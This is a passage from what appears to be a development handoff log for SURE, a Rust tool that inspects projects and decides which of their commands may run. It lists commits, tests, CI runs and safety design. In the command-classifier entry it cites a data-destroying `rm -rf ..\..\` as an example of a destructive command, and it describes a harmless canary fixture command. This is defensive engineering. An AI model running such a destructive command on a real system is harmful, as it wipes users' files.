  `fe7ad52` **`P0-T007`** and `9d95e1a` **`P0-T008`** — **five commits, and every
  one of them is empty: together they change no file at all.** They freeze, in
  prose: six explicit `CheckStatus` values and the aggregation rule that keeps a
  critical check which failed, errored, is `unknown` or was skipped for a reason
  other than an honest scope limit from reaching green (`P0-T004`);
  `IntentSource`, and the rule that an inference or an agent claim can never
  become a user requirement (`P0-T005`); six independent permissions where none
  implies network access, file writes or service connections (`P0-T006`); the
  three harness tiers plus a self-consistency rule that rejects a protected-tier
  claim with no pre-action control (`P0-T007`); and the no-daemon,
  no-hosted-model decision encoded as an absent dependency rather than as a
  promise (`P0-T008`). **An empty commit is a legitimate artefact here — it is a
  decision that has no code — and this entry exists because the alternative is
  five task ids that are `accepted` and appeared nowhere below this heading.**
- `4f2d75d` P0-T009 — foundational ADRs, plus `FROZEN_SEMANTICS.md`.
- `4ce2ce6` P1-T001 — declared crate boundaries, mechanically enforced by
  `sure_testkit::workspace` and `sure_testkit::integrations`.
- `6f63801` P1-T002 — `variants!` `ALL` lists and the pinned wire contract.
- `P1-T003` — `crates/sure-core/src/config/`: the `sure.yaml` model, loader,
  diagnostics and redaction, plus `docs/architecture/CONFIG_REFERENCE.md` and
  `docs/adr/0011-project-configuration-is-a-request.md`.
- `b6a14b4` P1-T004 — OS-native data paths and the outside-the-project rule.
- `ad05ee1` P1-T006 — diagnostics as records, and redaction.
- `P1-T007` — `crates/sure-protocol/`: the schema validator, the document
  registry, the event envelope, 27 conformance/round-trip tests and
  `docs/architecture/PROTOCOL.md`.
- `P1-T005` — `crates/sure-core/src/store/`, the concurrency and packaging tests,
  and §The store in `STORAGE_AND_DATA_PATHS.md`.
- `P1-T008` — `crates/sure-cli/`, `docs/architecture/CLI.md`, and the `PROTOCOL.md`
  amendment that keeps "everything SURE writes is one of seven documents"
  literally true.
- `ec8c293` P1-T009 — `sure doctor`, `crates/sure-core/src/doctor.rs` and
  `crates/sure-cli/src/doctor.rs`.
- `8892e48` P1-T010 — `crates/sure-protocol/src/handshake.rs`, `sure protocol
  --speaks`, and §The handshake in `PROTOCOL.md`.
- `b6ca862` P1-T011 — `crates/sure-core/src/config/authority.rs`, `load_file`,
  and the rewritten `CONFIG_AUTHORITY.md`. **This closed P1.**
- `82f3cf7` P2-T001 — `crates/sure-core/src/scan/`, `tests/scan_project.rs`, and
  the new `docs/architecture/PROJECT_DISCOVERY.md`. **This opened P2.**
- P2-T002 — `crates/sure-core/src/fingerprint/` (the `git` and
  `digest` modules), `tests/fingerprint_git.rs`, the new
  `docs/architecture/FINGERPRINTING.md`, and the `scan/ignore.rs` `left_out`
  extraction. The commit hash is in `progress/state.json`'s `P2-T002` note and in
  `git log --oneline -n 4`.
- `58b3793`, `c735a2f`, `9f13f0d` — three follow-up commits on the *accepted*
  `P2-T002`, none of them a new task. `58b3793` and `c735a2f` are the CI fixes
  (the first was a guess and failed; the second read the log and worked), and
  `c735a2f` also refuses a path that climbs out of the project. `9f13f0d` stops
  a repository making Git run a program or hang a check. **`P2-T002`'s acceptance
  stands over all four**: none of them changes a verdict for a project that is
  not hostile, and the acceptance run's own red CI is recorded above rather than
  quietly re-run.
- `5705444` — a fifth follow-up on the *accepted* `P2-T002`, and the only one
  that changes a verdict for a **non-hostile** project: a repository that names a
  filter is now refused where it used to be fingerprinted. That is the whole
  point of it (see "What the filter hardening added" above), and it is a real
  behaviour change rather than a hardening nobody can observe. `P2-T002`'s
  acceptance still stands — its two criteria are about a project that is not
  hostile — but this is the commit to look at if a legitimate project starts
  being refused.
- `7ce90bf` **`P2-T003`** — `crates/sure-core/src/fingerprint/{content,choose,
  read}.rs`, `tests/fingerprint_content.rs`, and the rewritten two-kinds half of
  `docs/architecture/FINGERPRINTING.md`. The `read.rs` extraction is the one part
  of it that is a refactor rather than new behaviour, and it is the part with the
  least new test cover — deliberately, because its cover is the Git kind's tests,
  which did not change and did not need to.
- `68e51d8` **`P2-T004`** — `crates/sure-core/src/discover/{mod,read,node}.rs`,
  `tests/discover_node.rs` (33 tests, the new 19th test binary), and the new
  `docs/architecture/ECOSYSTEM_DISCOVERY.md`. The module is a reader: it executes
  none of the scripts it reports, which is the property it is shaped around.
- `e10f620` **`P2-T005`** — `crates/sure-core/src/discover/python.rs`,
  `tests/discover_python.rs` (31 tests, the new **20th** test binary), the
  Python half of `docs/architecture/ECOSYSTEM_DISCOVERY.md`, the promotion of
  `toml` from a test-support dependency to a real one, and small extensions to
  `mod.rs` (`Ecosystem::Python`, `Findings::Python`), `read.rs` (`read_text_file`
  and the four `toml`-conversion tests) and `scan/ignore.rs` (`.tox`, `.nox`,
  `.eggs` as vendored). **A second ecosystem is the point of it**: the enum that
  refuses to let "not there" arrive as "there but unreadable" survived being
  written a second time, and the one-budget-serves-both fact is recorded rather
  than discovered.
- `9c931d0` P2-T006 — `crates/sure-core/src/discover/rust.rs` (2885 lines, 30 unit
  tests), `tests/discover_rust.rs` (24 tests, the new **21st** test binary),
  `src/discover/pattern.rs` (the member-pattern expansion lifted out of
  `node.rs`), the Rust half of `docs/architecture/ECOSYSTEM_DISCOVERY.md` with
  five new gaps, and small extensions to `mod.rs` (`Ecosystem::Rust`,
  `Findings::Rust`, `MemberManifest` lifted) and `node.rs` (the re-export that
  keeps its old names). **The third ecosystem closes the trio, and it is the one
  that put the readers under real pressure**: `Cargo.toml` has a shape neither of
  the other two has, in that its two top-level tables are siblings either of which
  can be absent, so the "not there is never there-but-unreadable" rule could not
  simply be copied — `Manifest` and `PackageSection` had to be split, and the
  commands had to be gated on the document rather than on the package. Both splits
  are pinned by mutations that revert them.
- `586d3a3` **`P2-T007`** — `crates/sure-core/src/components.rs`:
  `ComponentGraph::of(&Discovery)` is a pure view that opens no file, so it cannot
  disagree with the discovery it came from about what was in the project;
  `Component` carries one `ManifestReading` per ecosystem rather than a merged
  verdict, so there is no merge to get wrong; `Stack` is derived from those
  readings rather than stored; `Members` has a `NotRead` arm that keeps "SURE did
  not look" apart from "there are none". **Not established:** nothing in the
  product reads a `ComponentGraph` yet — the same family as `DocumentReport`
  below and `ProjectSupport` before it.
- `4746c48` **`P2-T010`** — `crates/sure-core/src/project_intent.rs`
  (`explicit_goal`, `record`, `EXPLICIT_GOAL_ID`), `tests/project_intent_ingest.rs`
  (8 tests, a new binary), and the CLI-side cover the store needed. **The +30 over
  the run before it is attributed by binary name rather than by total**: the
  `sure-core` lib +9, the `sure` bin +12, `cli_contract` +1, and the new binary at
  8. A goal typed on the command line is stored **verbatim**, marked
  `raw_retained`, and **no recording is written** — the test asserts the absence
  directly, because "no recording was written" is the half of the acceptance that
  a test asserting only "a row appeared" would miss. One requirement, one row: the
  schema describes a `Requirement` and not the container around it.
- `d5261a6` **`P2-T012`** — `crates/sure-core/src/support.rs` (the rule and its
  four unit tests), `tests/support_levels.rs` (7 tests, the new **24th** test
  binary — the by-name table counts 23 named binaries before this commit and 24
  after, and the 4 `Doc-tests` targets are the rest of the 28 parents), the
  `ProjectSupport` unit test that `sure-domain`'s vocabulary was
  missing, one added to `tests/wire_contract.rs` for the `serde(default)`
  behaviour an existing stored record depends on, and three documentation
  changes. **The one task on this branch that changes what every project is
  reported as**: every project is now classified `inspect_only`, deliberately and
  with the argument recorded, because levels A and B both require *running*
  checks and this build runs no project code.
- `ec8456d` **`P2-T008`** — `crates/sure-core/src/references.rs` (25 unit tests)
  and `tests/config_references.rs` (18 tests, the new **25th** named test binary —
  the count of `Running` lines goes 24 → 25, and the 4 `Doc-tests` targets make up
  the rest of the 29 parents). **The one task on this branch whose rule is
  enforced by a type rather than by a check**: no field on `Reference` or
  `Declaration` can hold a value, and `key_from_env_line` returns an owned key
  with nowhere for the right-hand side to go. `.env` is never opened and is not
  reported as unread either, so `is_complete()` stays true — a decision, not a
  loss. Reads no file it was not handed, and changes no other module's behaviour.
- `b644462` **`P2-T009`** — `crates/sure-core/src/documents.rs` and
  `tests/document_commands.rs` (20 tests). `DocumentReport::of(&Discovery)` reads
  each document's fenced blocks and returns a `DocumentedCommand` per command
  line. **The one task on this branch whose central claim is about something that
  did not happen**: the fixture's command is
  `npm install && echo SURE-RAN-THIS > SURE-RAN-THIS.txt`, so the evidence of a
  leak is a file whose absence is checkable rather than an inference — held with a
  control proving the snapshot helper can see a new file. "Never auto-executed" is
  a property of the shape: no field can hold a program and its arguments, and no
  function turns a `DocumentedCommand` into an `ApprovedCommand`, so the path
  **does not exist** rather than being blocked.
- `73da9a6` **`P2-T011`** — `crates/sure-core/src/intent_model.rs` (14 unit tests)
  and `tests/intent_sources.rs` (7 tests, the new **27th** named test binary), plus
  `pub mod intent_model;` and a corrected `docs/architecture/PROJECT_INTENT.md`.
  **The one task on this branch whose rule is enforced by an absent parameter**:
  every channel has a door that writes its own label, and no function that
  produces a `Requirement` accepts a source, so there is nothing to ask with.
  `observed_user_request` takes an `&Authority` rather than a `&Config`, so the
  same bytes in `sure.yaml` are a **request** and the user's own settings outside
  the project are the **grant** — asserted with one file, byte for byte, refused
  and then permitted. **This closed phase `P2`.**
- `819d499` **`P3-T001`** — `crates/sure-core/src/process/` (`mod.rs`, `request.rs`,
  `outcome.rs`, `terminate.rs`, `error.rs`; 1478 lines), `tests/process_runner.rs`
  (29 tests, 6 of them `#[ignore]`d children) and `tests/spawn_sites.rs`
  (2 tests) — the new **28th** and **29th** named test binaries, so the by-name
  count goes 27 → 29 and the 4 `Doc-tests` targets make up the rest of the 33
  parents. **The one task on this branch that can start a process, and the only
  one whose central claim is held as a test about the code's shape rather than
  about its behaviour**: `spawn_sites.rs` asserts that every place SURE builds a
  `Command` is named in that file, and that **nothing outside the runner names a
  process request at all** — so "no product path runs a program yet" is a test
  that fails when that stops being true, rather than a sentence in a document.
  Beyond the new module the task corrected six shipped files that carried a claim
  it made false: four said no `.cmd`/`.bat` is ever named (`process/mod.rs`,
  `process/request.rs`, `process/error.rs`, `doctor.rs`), and two more
  (`documents.rs`, `support.rs`) said `sure-core`'s shipped code has exactly one
  `Command::new`, which is now three. `doctor.rs` was the same shape of error one
  step further in — its executable-suffix list was right and the reason stated
  for it was wrong, so only the comment changed and no behaviour did.
  **This opened phase `P3`.**
- `fd878e6` **`P3-T002`** — `crates/sure-core/tests/process_runner.rs` and nothing
  else: **29 tests → 36** (23 parents + 6 children → 28 parents + 8 children), the
  file going from **1233 to 1729 lines** (`+558 −62` in `git show --stat`). **The one task on this branch whose delivery
  is entirely tests, and the one whose acceptance was already satisfied on
  paper**: `P3-T001` had recorded a test per sentence, and re-reading the
  sentences against the file found "Paths with spaces/Unicode are covered" holding
  in one position out of five and one test asserting an absence that a thing which
  never existed also satisfies. Four new tests cover the program path, an
  argument, the report path and the bytes coming back out, over one
  `const AWKWARD` and one `const NOT_ASCII`; the tree test gained a positive
  control (`<report>.started`) and a release probe (`<report>.release`) and lost a
  1.5-second sleep. **No shipped file changed, so no behaviour changed** — which
  is why the four matrix tests are recorded as **characterisation tests** rather
  than as mutation-covered, and why the one mutation this task added is about the
  position that can be got wrong in the code as written. **Not established:**
  anything about a path that is not valid UTF-8, which is `P3-T003`'s question.
- `b0dcc69` + `ea2f826` **`P3-T003`** —
  `crates/sure-core/tests/process_runner.rs` (**36 tests → 41**, 1729 lines →
  **2118**; `+313 −3` then `+100 −21`), `.github/workflows/ci.yml`
  (`cargo test --workspace` → `--no-fail-fast`, **+5 −1**), and
  `docs/development/GITHUB_WORKFLOW.md`. **The one task on this branch whose
  delivery is a claim about the other two platforms, and the first whose first
  commit CI said was wrong**: the platform matrix has **three columns rather than
  two** because a row reading "Linux and macOS: bytes are bytes" was true of
  Linux, and macOS refuses a file name that is not valid UTF-8 outright
  (`EILSEQ`, errno 92). **Every cell is now held by a test that runs on the
  platform it is about** — the file's own gates are `#[cfg(unix)]`,
  `#[cfg(target_os = "linux")]`, `#[cfg(target_os = "macos")]` and
  `#[cfg(windows)]`, and each names the platform that *answers* the question
  rather than the platforms that do not. The acceptance — *"CI covers
  platform-specific runner behavior"* — is then arithmetic: **+1 / +3 / +3**
  parent tests on Windows, macOS and Ubuntu, one different number per platform
  because each job compiles different code. **No shipped file changed.** The
  second half is not about the runner at all: CI was running a command set that
  stops at the first failing target — measured at **3 targets launched against
  29** — so 26 of them were invisible, and the red run is where the flag paid for
  itself (14 binaries started after the failure, 19 of 33 parent result lines
  came after it). **Not established:** anything about a macOS on another
  filesystem, and nothing here settles whether a caller may name a `.cmd`/`.bat`.
- `0a577ca` — a defect fix, **not a task**, landed just before `P2-T004`'s
  implementation commit and found while verifying it. Five test helpers cleared a
  scratch directory with `let _ = remove_dir_all` and then treated the path as
  fresh; on Windows that deletion can fail and the discarded error produced a
  **false report** — `store_concurrency` announced 200 records where 100 had been
  written, about a file that was never cleared. One instance is proven, four are
  not, and the section above says which is which. Nothing about the product's
  behaviour changes; every file it touches is test code.

- `967c5e6` **`P3-T004`** — `crates/sure-core/src/safety.rs` (+1278, new, the
  classifier and its command table), `tests/command_safety.rs` (+637, new, the
  **30th** named test binary), `crates/sure-domain/src/execution.rs` (+414:
  `CommandClass`, `CommandEffects`, 10 module tests),
  `tests/wire_contract.rs` (+10 −1, the five wire names frozen) and
  `pub mod safety;`. **The first task on this branch that reads a command line at
  all, and the only one whose whole safety argument is a direction rather than a
  rule**: nothing is `Static` unless a rule in the file says so, so an unknown
  program, an unknown operation, an unreadable argument and text SURE cannot read
  all come back as *every category but `Static`*. `Destructive` answers `None` to
  `required_permission()` on purpose — `WriteProject` is writing inside the
  project, which `rm -rf ..\..\` is not — and what covers it was left as
  `P3-T005`'s question rather than guessed at here. **The name rule is read with
  `cfg!` rather than `#[cfg]`**, so both arms compile and the test asserts *this
  machine's* rule on every platform instead of being deleted on two of them.
  **Not established:** anything about the code a command runs, anything about what
  is on `PATH`, and any shell wrapper (`env`, `timeout`, `xargs`, `sudo`, `cmd`).
- `c940300` **`P3-T005`** — `crates/sure-core/src/consent.rs` (+1407, new, 22
  tests), `CheckPlan::exclude` in `vocabulary.rs` (+67), `CommandClass::
  plain_description` in `execution.rs` (+54), the `spawn_sites.rs` matcher fix
  (+65 −1) and `pub mod consent;`. **The task that joins the classifier to the
  decision and to the check plan, and whose second acceptance sentence is a
  property of the code's shape**: `PlannedCommand::refusal` is the only place a
  `CheckResult` is made and it cannot make a passing one — a command that may run
  returns `None`, a refused one returns `Skipped` with its reason and its weight
  kept. **It found a real bug in its own deciding code and the test that found it
  is the reason the code could be written at all**: `Install` was missing from
  `runs_project_code`, so `npm install` under `inspect_only` was `Denied` where
  `decide` answers `NeedsConsent`. **It answers `P3-T004`'s recorded question
  without inventing a sixth category**: a category no permission covers is not a
  gap in the permission set, it is a command that needs its own approval. **No
  spawn site was added**, so the level-C ceiling's justification is untouched.
  **Not established:** any consent record, prompt or host-execution
  authorisation; anything about the TOCTOU window between planning a command line
  and running it.
- `d58532a` **`P3-T006`** — `crates/sure-core/src/approval.rs` (+1777, new),
  `store/mod.rs` (+59 −1), `store/record.rs` (+90 −6),
  `crates/sure-domain/src/execution.rs` (+158) and `pub mod approval;`. **The
  gate that decides which commands may run, and the record that outlives the
  process that made it**: `P3-T005` could decide that a command `NeedsConsent`
  but nothing could construct the consent record it named, and nothing kept the
  answer — so this supplies the constructor, the gate that admits only what a
  grant covers, and a durable OS-native record of the approval. Run
  `34941955270`, all five jobs `success`, **1172 / 1173 / 1174** parents with 0
  failed and 9 ignored over 44 result lines = 34 parents + 10 children; the
  namesets move **`+30 −1` on all three platforms**, where the one name that left
  is a rename, so **a naive diff of the same change says `+31` and nothing on this
  machine would have contradicted it**. **A number in `d58532a`'s own message is
  wrong and cannot be rewritten**: it says `approval.rs` is 1490 lines and
  `git show --numstat` reads `1777 0`, because the figure was taken from a note
  while the file was still growing. **Not established:** any prompt, any grant a
  user actually gave, and anything about what a granted command then does.
- `6353477` + `18209d8` + `719253e` **`P3-T007`** — `enforce.rs` (+777, new, then
  +39 and +41: 921 lines today, 16 tests), `consent.rs` (+8 −1),
  `docs/architecture/EXECUTION_SAFETY.md` (+37) and `pub mod enforce;`. **The
  first task that makes `inspect_only` true for a reason rather than true because
  no runner exists**: `Enforcement::admitted()` is the only iterator a runner may
  take a command line from, a check is a unit, `NeedsConsent` is a stop rather
  than a question under `inspect_only`, and a command planned for an unscheduled
  check is reported and never admitted. Runs `34943445326`, `34943853809` and
  `34944133634` are all five jobs `success` with **1186 / 1187 / 1188**,
  **1187 / 1188 / 1189** and **1188 / 1189 / 1190** parents and 0 failed; the
  namesets move **`+14 −0`**, **`+1 −0`** and **`+1 −0`**. Four mutations, four
  caught, **and the third is the one worth reading**: the static/dynamic
  classification was held by one unrelated assertion, which is what `719253e`
  adds a direct test for. **No spawn site was added.**
- `6ea9f46` **`P3-T008`** — `crates/sure-core/src/container.rs` (+1010, new, 16
  tests), `crates/sure-core/tests/container_isolation_claim.rs` (+276, 5 tests),
  `doctor.rs` (+11 −2), `crates/sure-domain/src/execution.rs` (+17 −4),
  `docs/adr/0009-explicit-execution-trust.md` (+17 −1) and
  `EXECUTION_SAFETY.md` (+22 −3). **Its harder acceptance sentence is about
  prose**: four places called the container mode *isolated* and were corrected to
  **limited isolation**, and the wording is now a check rather than a one-time
  correction — `OVERCLAIMS` and `overclaims()` are applied by the new test file
  to every shipped `.rs` under `crates/` and every `.md` under `docs/`.
  **`Availability` has no error variant**, so a machine with neither Docker nor
  Podman is a value rather than a failure, and `ContainerPlan` holds the image,
  the mount and its access, the network mode and the working directory as fields.
  Run `34946515895`, all five `success`, **1209 / 1210 / 1211** parents, 0 failed,
  9 ignored, 45 result lines = 35 parents + 10 children, namesets **`+21 −0`**
  against `0f9273b`. Twelve mutations: eleven caught, and **the twelfth survived
  the whole workspace suite** — held by no test, because no test holds
  `doctor::find_in`'s empty-`PATH` rule. **No spawn site was added.**
- `6911e2a` + `12b81bc` **`P3-T009`** — `crates/sure-core/src/service.rs` (+411,
  new), `crates/sure-core/tests/service_supervisor.rs` (+807, then +20 −3: 824
  lines), the `AdmittedCommand` witness in `enforce.rs` (+76 −12),
  `run_when_started` in `process/mod.rs` (+49 −9), a rewritten ceiling paragraph
  in `support.rs` (+9 −5) and a third rule in `tests/spawn_sites.rs` (+153 −29).
  **Two commits because the first run was red, and it was red for a reason that
  was the test's fault rather than the product's**: `34952200942` is windows
  `success`, ubuntu `success`, **macOS `failure`**, on one assertion that compared
  a child's resolved `current_dir` against an unresolved temp path — `/var` is a
  symlink to `/private/var` on macOS. `34952509429` is all five jobs `success`:
  **1217 / 1218 / 1219** parents, 0 failed, 11 ignored, 46 result lines = 36
  parents + 10 children, and the name-delta between the red run and the green one
  is **`+0 −0` on all three platforms**, which is what a one-assertion fix
  predicts. Seven mutations, seven caught, each by exactly one test. **There is no
  `is_ready`, deliberately**: `start` returning `Ok` means the operating system
  accepted the spawn, and *a process exists* is not *it is listening*.
  **`Service::stop(self)` is the only way to be told what a service printed**, and
  dropping one takes the outcome with it. **This commit is also the one that left
  the header at the top of this file stale**, which the paragraph above records.
- `43c4a61` + `9ad32e6` + `0eb1ac3` + `01fc2a7` **`P3-T010`** —
  `crates/sure-core/src/probe.rs`
  (+818, then +49, then +15 −8, then +86 −1: 959 lines, 3 module unit tests),
  `crates/sure-core/tests/probe_local_service.rs` (+802, 20 tests),
  `crates/sure-domain/src/status.rs` (+67: `CheckResult::unknown` and one test)
  and `pub mod probe;`. **The first task since `P2-` to add a constructor to the
  frozen vocabulary**, because `CheckStatus::Unknown` had none and this is the
  first check that needs one — the only status whose evidence class is a
  parameter, and the parameter is the whole of what separates it from `not_run`.
  **The acceptance's second sentence is held by keeping the port question off the
  verdict path rather than by having no port question**: `opened_a_connection` is
  public, returns `bool`, and no verdict reads it — `status()` matches the variant
  and `NoAnswer` is `CheckStatus::Unknown` however the caller asks. Run
  `34955834313`, all five `success`, **1250 / 1251 / 1252** parents, 0 failed, 11
  ignored, 47 result lines = 37 parents + 10 children, namesets **`+23 −0`**
  against `34954317400` with the identical added set on all three. Eleven
  mutations, ten caught — **and `m8` is the finding**: deleting the `WouldBlock` arm of
  `is_a_timeout` passed all twenty integration tests, because **Windows reports an
  expired socket read timeout as `TimedOut` and a Unix reports the same condition
  as `WouldBlock`**, so no test reachable from a socket on this machine can
  produce the Unix spelling. It is now held by one unit test, which is the only
  thing in `sure-core` that catches it. **`0eb1ac3` is a third commit and it fixed
  a sentence rather than code**: the module header, this section and `DECISIONS.md`
  all said the module had no boolean asking whether the port is open, and it has
  had one since `43c4a61` — the source file's false claim was already pushed and
  the other two had not been written out yet. **`01fc2a7` is a fourth commit and
  it fixed code rather than prose, found by a run that prose could not have
  caused**: a free loopback port can connect to itself, the probe read its own
  request line back, and the test that caught it failed **only on Windows**, on a
  commit that changes one comment. Run `34956776646` is the red and `34957515713`
  is the green — all five `success`, **1251 / 1252 / 1253**, 0 failed, 11 ignored,
  47 result lines = 37 parents + 10 children, **+1 on every platform** and the one
  failing test moved out of the failed column. **`m11` deletes that branch and
  survives all 591 tests in `sure-core`**, so the fix's own line is held by
  nothing; the predicate it calls is held by a unit test. **Not established:**
  whether the feature works — a pass names the request it made, not the feature —
  and nothing parses a body, a header or a `Content-Length`.
- `706d44f` **`P3-T010` acceptance** — `progress/state.json` and
  `progress/HANDOFF.md` only. Run `34958280318`, all five jobs `success`, and
  **1251 / 1252 / 1253** with 0 failed, 11 ignored, **47** result lines = **37
  parents + 10 children** — **identical to `34957515713` in every column**, which
  is the reading a progress-only commit is supposed to produce and the reading a
  reader can use to tell one from a commit that changed something.
- `be02100` **`P3-T011`** — `crates/sure-core/src/browser.rs` (+1261: **843 lines of
  module above its `#[cfg(test)]` and 418 below it**, 19 `#[test]` functions),
  `crates/sure-core/tests/browser_probe.rs` (+427, 7 tests) and one line of
  `lib.rs`. **The acceptance's first sentence is a value rather than an error
  path**: `Report` is `Absent(Absence)` or `Observed(Observation)`,
  `AbsenceReason` has five variants, and
  `every_absence_reason_is_skipped_and_none_of_them_produced_a_result` loops over
  `AbsenceReason::ALL` asserting `Skipped` — so a sixth reason added later that
  landed on a `pass` fails a test rather than shipping. **Four of the five answer
  a `NotCheckedReason` whose `is_scope_limit()` is false**, so a critical browser
  check that could not run **blocks** green; the fifth is the project switching
  the check off, which is a scope limit and does **not** make the run green —
  `aggregate` keeps it at `NeedsAttention`, or at `NotEnoughChecked` when nothing
  ran at all. **The second sentence is an absence, so a source rule holds it**:
  the trait's own body names neither `CheckStatus` nor `CheckResult`, the shipped
  part of the module contains exactly one `-> CheckResult` and one `-> CheckStatus`,
  and `sure-domain/src/status.rs` contains none of `browser`, `console`, `page` or
  `driver`. **Two findings from the work.** `UnsupportedPlatform` was written as
  `UnsupportedStack` first, and since `UnsupportedStack` *is* a scope limit a
  critical browser check on an OS SURE cannot drive would have **stopped blocking
  green** — the test caught it and the mapping was what was wrong. And **a false
  green was found in the interface rather than in the mapping**: a page served a
  404 renders, has a title, reports no console errors and loads completely, so
  every field of the first draft's `Observation` added up to a pass about a page
  that was never served — **no mapping could fix it, because a driver had no way
  to *say* the status**, so `document_status: Option<u16>` is part of the interface
  and `None` is `Unknown`. Run `34959719084`, all five `success`, **1277 / 1278 /
  1279** parents, 0 failed, 11 ignored, **48** result lines = **38 parents + 10
  children**, namesets **`+26 −0`** against `34958280318` **on all three
  platforms**. Twelve mutations, twelve caught, eleven by exactly one test — and
  **`m5` is the finding**: a second `CheckStatus`-returning function passes all
  611 lib tests, because a function nothing calls is not a behaviour a test can
  observe, and only the source rule sees it. **Not established:** whether any
  driver is honest — the interface keeps a driver from *spelling* a verdict, not
  from being *wrong* — and no browser is started, because that is `P5-T004`.
- `97f0707` **`P4-T001`** — `crates/sure-core/src/schedule.rs` (+2101: **886 lines
  of module above its `#[cfg(test)]` and 1215 below it**, 20 `#[test]` functions),
  `crates/sure-core/tests/check_schedule.rs` (+766, 9 tests) and one line of
  `lib.rs`. **The acceptance sentence names something the frozen `CheckPlan`
  cannot hold** — the plan is identifiers, a mode and a fingerprint and nothing
  else, so it cannot carry a reason or an evidence class — so what this adds is a
  *schedule*, and `CheckSchedule::planned_checks` is the one bridge to
  `Enforcement::of`. **"Ordered" is a function of the checks and not of a caller's
  loop**: runs nothing first, then severity worst first, then identifier, held
  over **all 120 permutations** of a five-check set by a sweep that collects the
  orders it visited rather than counting them, and **the mode is deliberately not
  a rule** — a decision is not a property of a check, so folding it in would make
  a caller unable to tell a changed decision from a reshuffled plan. **A blocked
  check stays in the plan**, and the only status the module can produce is a
  `Skipped` one, through a `not_run` that returns `None` for a check that would
  run. **Two findings.** A sentence a user would have read was wrong —`blocked_by`
  filtered on the *decision*, so it named permissions the user had **already
  granted** and `plain_description` said *"will not run: run_project_code"* about
  one of them — and it was found by a test written for another reason; both
  functions now take **no mode**, and the wording has three outcomes so a check
  the mode stopped says *"will run only if you agree"*. And **one mutation
  survived the first run of the set**: `may_run` answered from
  `blocked_by.is_none()` passes all 630 tests, because the two agree whenever a
  permission is denied and come apart exactly where every permission is granted
  and the mode still refuses — where the check would **vanish from the report**
  rather than appear as one that did not happen. The test that kills it exists
  only because of that survivor. Run `34963032089`, all five `success`, **1306 /
  1307 / 1308** passed, 0 failed, 11 ignored, **49** result lines = **39 parents +
  10 children**, namesets **`+29 −0`** against `34959719084` **on all three
  platforms**. Nineteen mutations, nineteen caught, twelve by exactly one test.
- `0bf09c2` **`P4-T002`** — `crates/sure-core/src/checks/mod.rs` (+651, new:
  `check_id` and its digest domain, `MissingKind`, `MissingCommand`, 5 unit
  tests), `crates/sure-core/src/checks/node.rs` (+1022, new: the role table over
  `ScriptRole`, `Runner::of`, and `NodeChecks` with its `proposed` and `missing`
  halves), `crates/sure-core/tests/node_checks.rs` (+731, 9 integration tests),
  `crates/sure-core/src/schedule.rs` (3 edits, +38 −25), `crates/sure-core/src/
  discover/node.rs` (`MANIFEST` made `pub`), `crates/sure-core/src/fingerprint/
  mod.rs` (`mod digest` made `pub(crate)`), `crates/sure-core/tests/
  check_schedule.rs` (the `MAY_PROPOSE` list and a test that every exemption is
  still a proposer) and one line of `lib.rs`. **The task is the first thing on
  this branch that proposes a check, and the rule that nothing did was meant to
  fail here** — `tests/check_schedule.rs` carried it from `P4-T001` and this is
  the commit that amends it. **The vocabulary gap is the whole of the task**:
  `NotCheckedReason` is frozen and has no word meaning *"the project declares this
  and what it declares is not something SURE can run"*, and the three ways a role
  ends up with no command need three different answers — `NotApplicable` is true
  for a project that declares none and false for one that wrote `"test": ["jest"]`,
  `ToolUnavailable` is a claim about the machine, `UnsupportedStack` is false here,
  so two of the three map onto `UnknownReason`; the choice matters because
  `blocks_green` reads `is_scope_limit`, and mapping a broken manifest onto
  `NotApplicable` would put it **outside** what can hold a run out of green. **The
  first mutation run left four survivors and all four were the same finding** — a
  claim with prose and no test — and the test written to kill the fourth survived
  its own mutation until its fixture was changed to a project that declares
  nothing. Run `34969139607`, all five `success`, **1334 / 1335 / 1336** passed, 0
  failed, 11 ignored, **50** result lines, **`+28` on every platform** against
  `34964462368`, and the Windows name table decomposes that `+28` as `+18`
  `sure_core`, `+9` new `node_checks`, `+1` `check_schedule`, **`+0` on the other
  thirty-six names**. Twenty-three mutations, twenty-three caught, eight by
  exactly one test.
  **Not established:** whether any check is any good. A caller that labels a guess
  `ObservedFact` has lied in a way this module cannot detect, and **nothing in the
  product proposes a check yet** — that is `P4-T002`, `P4-T003` and `P4-T004`, and
  `tests/check_schedule.rs` names the files that may construct a `CheckProposal`
  and says it is written to fail on that day.
- `4fd5663` **`P4-T003`** — `crates/sure-core/src/checks/python.rs` (+1536, new:
  the four-row `Role` table over `CommandRole`, `Runner::of`, and `PythonChecks`
  with its `proposed` and `missing` halves), `crates/sure-core/tests/
  python_checks.rs` (+867, 14 integration tests), `checks/mod.rs` (+75 −?:
  `MissingKind::NotReadable`), `discover/python.rs` (98 lines changed) and
  `tests/check_schedule.rs` (+12). Acceptance: *"Declared import/test/lint/type
  checks use available tools without silent package installation."* **Four words
  and three roles, because `import` is not a role** — it is read as `Install` on
  the evidence of the sentence's own second half, and the reason it needs reading
  twice is that `CommandRole::ALL` is install, test, lint, type, format, build.
  `InstallStep` is not a `CheckProposal`, cannot enter a `PlanBuilder` and cannot
  acquire a `CheckResult`, so `ActionKind::InstallDependencies` cannot reach a
  schedule by any route, and `nothing_this_module_proposes_installs_anything`
  holds that over every project shape rather than the ones somebody thought of.
  **SURE proposes no `import` check and says where the row would have been**:
  `PyYAML` imports as `yaml` and `scikit-learn` as `sklearn`, so deriving the
  mapping would be inventing a convention and then running a command on it.
  **`Runner` is the idea this ecosystem needed**: `command_for` has an answer when
  `Managers::agreed` is `None` — `python -m <tool>` — and that is a *third*
  interpreter neither declaration named, whose failure reads `No module named
  pytest`, a sentence true only about the interpreter SURE picked. So disagreement
  makes every declared role a `NoRunner` gap instead of a command.
  `MissingKind::NotReadable` is the vocabulary gap: poetry's
  `mypy = { version = "^1.8", extras = […] }` is an ordinary declaration that
  never reaches `TOOLS` and would otherwise be reported as *"you declare no type
  checker"* about a manifest with `mypy` written in it. Run `34974577185`, all
  five `success`, **1363 / 1364 / 1365** passed, 0 failed, 11 ignored, **51**
  result lines = **41 parents + 10 children**, **`+29` on every platform** with
  namesets **`+29 −0`**.
- `c9d594f` **`P4-T004`** — `crates/sure-core/src/checks/rust.rs` (+1339, new:
  the `CHECKS` table over `CommandRole::{Format, Check, Lint, Test}` and
  `RustChecks`), `crates/sure-core/tests/rust_checks.rs` (+904, 14 integration
  tests), `checks/mod.rs` (+283), `schedule.rs` (+48 −?), `discover/rust.rs` and
  `tests/check_schedule.rs` (+16 −?). Acceptance: *"fmt/check/clippy/test evidence
  binds to current fingerprint."* **The four words are four `CommandRole`s, and
